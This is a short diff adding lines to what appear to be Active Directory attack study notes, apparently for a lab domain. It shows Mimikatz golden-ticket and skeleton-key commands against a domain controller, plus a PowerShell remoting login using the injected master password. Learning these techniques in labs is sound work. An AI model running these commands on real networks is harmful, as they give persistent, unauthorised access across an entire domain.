@@ -428,3 +428,6 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - Yet again, mimikatz to the rescue.
 - Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA priviles required.
 - `Invoke-Mimikatz -Command '"privilege::debug" "misc:skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
+- Now, it is possible to access any machine with a valid username and password as `mimikatz`
+- `Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator`
+- You can access other machines as well as long as they authenticate with the DC which has been patched and the DC is not rebooted.
